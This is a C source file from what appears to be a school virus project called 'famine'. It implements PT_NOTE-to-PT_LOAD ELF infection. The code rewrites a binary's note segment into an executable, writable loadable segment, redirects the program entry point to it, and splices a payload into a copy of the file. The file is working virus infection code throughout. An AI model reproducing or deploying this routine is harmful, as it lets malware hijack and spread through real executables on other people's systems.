/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   pt_note_to_pt_load_infection.c                     :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mabouce <ma.sithis@gmail.com>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/09/23 18:04:56 by mabouce           #+#    #+#             */
/*   Updated: 2021/09/23 18:04:56 by mabouce          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

void update_note_segment(t_famine *famine)
{
    const size_t base = famine->p_data.p_vaddr + famine->p_data.p_memsz;
    const size_t add_padding = base % famine->p_data.p_align;

    famine->p_note.p_vaddr = base + (famine->p_data.p_align - add_padding);
    famine->p_note.p_paddr = famine->p_note.p_vaddr;
    famine->p_note.p_offset = base - add_padding;

    famine->p_note.p_filesz = famine->payload_size;
    famine->p_note.p_memsz = famine->payload_size;

    famine->p_note.p_type = PT_LOAD;
    famine->p_note.p_flags = (PF_X | PF_W | PF_R);
    famine->p_note.p_align = famine->p_data.p_align;
}

void pt_note_to_pt_load_infection(t_famine *famine)
{
    if (DEBUG == true)
        printf("Applying pt_note_to_pt_load infection.\n");
    t_elf_phdr segment;
    bool p_data_found = false;
    bool p_note_found = false;
    // Create the output file
    if (!(famine->infected_file = malloc(famine->binary_data_size + PAGE_SIZE)))
    {
        error(ERROR_MALLOC, famine);
    }
    famine->infected_file_size = famine->binary_data_size + PAGE_SIZE;

    for (size_t i = 0; i < famine->ehdr->e_phnum; i++)
    {
        segment = famine->phdr[i];
        if (is_data_segment(segment) == true)
        {
            p_data_found = true;
            famine->p_data = segment;
            famine->p_data_end_offset = famine->p_data.p_offset + famine->p_data.p_filesz;
        }
        if (is_note_segment(segment) == true)
        {
            p_note_found = true;
            famine->p_note = segment;
        }
    }

    if (!p_note_found || !p_data_found)
    {
        error(ERROR_SECTION_NOT_FOUND, famine);
    }

    famine->ehdr->e_entry = famine->p_note.p_vaddr;
    famine->new_entry_point = famine->ehdr->e_entry;

    famine->ehdr->e_shoff += famine->payload_size + (famine->p_note.p_offset - famine->p_data_end_offset);
    update_note_segment(famine);

    // Copy until end of data section.
    memcpy(famine->infected_file, famine->mmap_ptr, famine->p_data_end_offset);
    // Copy payload.
    memcpy(famine->infected_file + famine->p_data_end_offset, famine->payload_data, famine->payload_size);
    // Copy the rest of the binary.
    memcpy(famine->infected_file + famine->p_data_end_offset + famine->payload_size, famine->mmap_ptr + famine->p_data_end_offset, famine->binary_data_size - famine->p_data_end_offset);
}
